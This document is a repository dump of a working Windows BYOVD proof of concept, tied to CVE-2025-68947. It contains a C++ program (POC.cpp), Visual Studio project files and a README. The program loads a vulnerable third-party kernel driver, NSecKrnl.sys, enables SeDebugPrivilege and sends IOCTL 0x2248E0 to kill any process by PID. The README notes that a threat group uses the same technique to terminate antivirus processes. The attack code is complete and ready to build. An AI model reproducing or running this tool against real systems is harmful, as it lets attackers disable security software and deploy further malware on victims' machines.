Project Path: arc_ANYLNK_NSecSoftBYOVD_iau91ezg

Source Tree:

```txt
arc_ANYLNK_NSecSoftBYOVD_iau91ezg
├── NSecKrnl.sys
├── NSecSoftBYOVD
│   ├── NSecSoftBYOVD.vcxproj
│   ├── NSecSoftBYOVD.vcxproj.filters
│   └── POC.cpp
├── NSecSoftBYOVD.sln
└── README.md

```

`NSecSoftBYOVD.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.14.36408.4 d17.14
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "NSecSoftBYOVD", "NSecSoftBYOVD\NSecSoftBYOVD.vcxproj", "{12B68760-AE63-43BB-B81F-D2BD332794CF}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{12B68760-AE63-43BB-B81F-D2BD332794CF}.Debug|x64.ActiveCfg = Debug|x64
		{12B68760-AE63-43BB-B81F-D2BD332794CF}.Debug|x64.Build.0 = Debug|x64
		{12B68760-AE63-43BB-B81F-D2BD332794CF}.Debug|x86.ActiveCfg = Debug|Win32
		{12B68760-AE63-43BB-B81F-D2BD332794CF}.Debug|x86.Build.0 = Debug|Win32
		{12B68760-AE63-43BB-B81F-D2BD332794CF}.Release|x64.ActiveCfg = Release|x64
		{12B68760-AE63-43BB-B81F-D2BD332794CF}.Release|x64.Build.0 = Release|x64
		{12B68760-AE63-43BB-B81F-D2BD332794CF}.Release|x86.ActiveCfg = Release|Win32
		{12B68760-AE63-43BB-B81F-D2BD332794CF}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {5EC23638-6A75-4190-9612-7945EA33D86F}
	EndGlobalSection
EndGlobal

```

`NSecSoftBYOVD/NSecSoftBYOVD.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{12b68760-ae63-43bb-b81f-d2bd332794cf}</ProjectGuid>
    <RootNamespace>NSecSoftBYOVD</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp17</LanguageStandard>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp17</LanguageStandard>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="POC.cpp" />
  </ItemGroup>
  <ItemGroup>
    <None Include="..\NSecKrnl.sys" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`NSecSoftBYOVD/NSecSoftBYOVD.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="源文件">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="头文件">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="资源文件">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="POC.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="..\NSecKrnl.sys">
      <Filter>资源文件</Filter>
    </None>
  </ItemGroup>
</Project>
```

`NSecSoftBYOVD/POC.cpp`:

```cpp
#include <Windows.h>
#include <filesystem>
#include <iostream>

namespace fs = std::filesystem;

#define NT_SUCCESS(Status)((NTSTATUS)(Status)>=0)

typedef NTSTATUS(WINAPI* NtDeviceIoControlFile_t)(
	HANDLE, HANDLE, PVOID, PVOID, PVOID, ULONG, PVOID, ULONG, PVOID, ULONG
	); NtDeviceIoControlFile_t pNtDeviceIoControlFile = nullptr;

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID Pointer;
	};
	ULONG_PTR Information;
}IO_STATUS_BLOCK,*PIO_STATUS_BLOCK;

typedef struct _TerminateProcessInfo {
	HANDLE ProcessId;
}TerminateProcessInfo;

BOOL EnableSeDebugPrivilege() {
	BOOL bRet = FALSE;
	HANDLE hToken = NULL;
	LUID luid = { 0 };

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
			TOKEN_PRIVILEGES tokenPriv = { 0 };
			tokenPriv.PrivilegeCount = 1;
			tokenPriv.Privileges[0].Luid = luid;
			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
		}
	}
	return bRet;
}

BOOL LoadDriver(LPCWSTR DriverName, LPCWSTR DriverPath) {
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == NULL) {
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Open SC Manager Failed" << std::endl;
		return FALSE;
	}

	SC_HANDLE schService = CreateServiceW(schSCManager, DriverName, DriverName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, DriverPath, NULL, NULL, NULL, NULL, NULL);
	if (schService == NULL) {
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Create Driver Service Failed" << std::endl;
		return FALSE;
	}

	if (StartService(schService, 0, 0) == 0) {
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Start Driver Service Failed" << std::endl;
		return FALSE;
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
	std::cout << "[+]Load Driver Success." << std::endl;
	return TRUE;
}

BOOL UnloadDriver(LPCWSTR DriverName) {
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == NULL) {
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Open SC Manager Failed" << std::endl;
		return FALSE;
	}

	SC_HANDLE schService = OpenService(schSCManager, DriverName, SERVICE_ALL_ACCESS);
	if (schService == NULL) {
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Open Driver Service Failed" << std::endl;
		return FALSE;
	}

	SERVICE_STATUS status;
	if (QueryServiceStatus(schService, &status) == 0) {
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Query Service Status Failed" << std::endl;
		return FALSE;
	}
	if (status.dwCurrentState != SERVICE_STOPPED && status.dwCurrentState != SERVICE_STOP_PENDING) {
		if (ControlService(schService, SERVICE_CONTROL_STOP, &status) == 0) {
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			std::cout << "[-]Service Stop Failed" << std::endl;
			return FALSE;
		}
		/*
		INT timeOut = 0;
		while (status.dwCurrentState != SERVICE_STOPPED) {
			timeOut++;
			QueryServiceStatus(schService, &status);
			Sleep(50);
		}
		if (timeOut > 80) {
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			std::cout << "[-]Driver Service Stop TimedOut." << std::endl;
			return FALSE;
		}
		*/
	}
	if (DeleteService(schService) == 0) {
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		std::cout << "[-]Delete Driver Service Failed" << std::endl;
		return FALSE;
	}
	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
	std::cout << "[+]Unload Driver Success, Please reboot your PC for full unload!" << std::endl;
	return TRUE;
}

int main(int argc, char** argv) {
	int pid = 0;
	if (argc == 2) {
		pid = atoi(argv[1]);
		std::cout << "[+]Process PID to Terminate: " << pid << std::endl;
	}
	else {
		std::cout << "Usage: " << argv[0] << " [PID]" << std::endl;
		return 0;
	}

	std::cout << "[+]Terminate Target Process..." << std::endl;
	if (EnableSeDebugPrivilege()) {
		std::cout << "[+]Enable SeDebugPrivilege success."<<std::endl;
	}
	else {
		std::cout << "[-]Enable SeDebugPrivilege failed" << std::endl;
		return -1;
	}

	LPCWSTR ServiceName = L"NSecKrnl";
	auto CurrentPath = fs::current_path();
	std::string DrvName = "\\NSecKrnl.sys";
	std::string absolutepath = CurrentPath.string() + DrvName;
	std::wstring temp = std::wstring(absolutepath.begin(), absolutepath.end());
	LPCWSTR DrvPath = temp.c_str();
	std::wcout << "[+]Load Driver from" << DrvPath << std::endl;
	if (LoadDriver(ServiceName, DrvPath) == FALSE) {
		std::cout << "[-]Load Driver Failed." << std::endl;
		return -1;
	}

	HANDLE hDevice = INVALID_HANDLE_VALUE;
	hDevice = CreateFileW(L"\\\\.\\NSecKrnl", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "[-]Open Device Failed " << GetLastError() << std::endl;
		if (UnloadDriver(ServiceName) == FALSE) {
			return GetLastError();
		}
		return GetLastError();
	}
	std::cout << "[+]Open hDevice at 0x" << std::hex << hDevice << std::endl;

	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
	if (!ntdll) {
		std::cout << "[-]Get NTDLL module failed." << std::endl;
		if (UnloadDriver(ServiceName) == FALSE) {
			return -2;
		}
		return -1;
	}

	pNtDeviceIoControlFile = (NtDeviceIoControlFile_t)GetProcAddress(ntdll, "NtDeviceIoControlFile");
	if (pNtDeviceIoControlFile == nullptr) {
		std::cout << "[-]Get NtDeviceIoControlFile failed" << std::endl;
		if (UnloadDriver(ServiceName) == FALSE) {
			return -2;
		}
		return -1;
	}

	DWORD dwIoControlCode = 0x2248E0;
	TerminateProcessInfo ProcessInfo = { 0 };
	IO_STATUS_BLOCK ioStatus = { 0 };
	ProcessInfo.ProcessId = (HANDLE)pid;
	NTSTATUS status = pNtDeviceIoControlFile(hDevice, nullptr, nullptr, nullptr, &ioStatus, dwIoControlCode, &ProcessInfo, sizeof(ProcessInfo), &ProcessInfo, sizeof(ProcessInfo));
	std::cout << "[.]Operate completed with code 0x" << std::hex << status << std::endl;
	if (UnloadDriver(ServiceName) == FALSE) {
		std::cout << "[-]Unload Driver Failed, You may need to unload driver manually" << std::endl;
		return -1;
	}
	return 0;
}
```

`README.md`:

```md
# NSecSoftBYOVD

Update 2026.1.13: The vulnerbility has been assigned the number CVE-2025-68947

Reference: https://bbs.kafan.cn/thread-2284992-1-1.html, https://blog.csdn.net/qq_40827990/article/details/148997201

Same techniques are widely used by Silverfox Group to terminate AV processes

BYOVD

Usage: NSecSoftBYOVD.exe PID

The driver from Shandong Anzai must be under the same directory of the exe.

<img width="991" height="522" alt="屏幕截图 2025-09-15 010247" src="https://github.com/user-attachments/assets/508683a0-4c23-411b-a966-cb84eae08420" />
<img width="980" height="508" alt="屏幕截图 2025-09-15 010323" src="https://github.com/user-attachments/assets/79d85806-7bda-4b3e-9a4f-ab9417513059" />
<img width="989" height="507" alt="屏幕截图 2025-09-15 010502" src="https://github.com/user-attachments/assets/06a34543-e886-4f53-8cff-d613a7fed7cd" />

```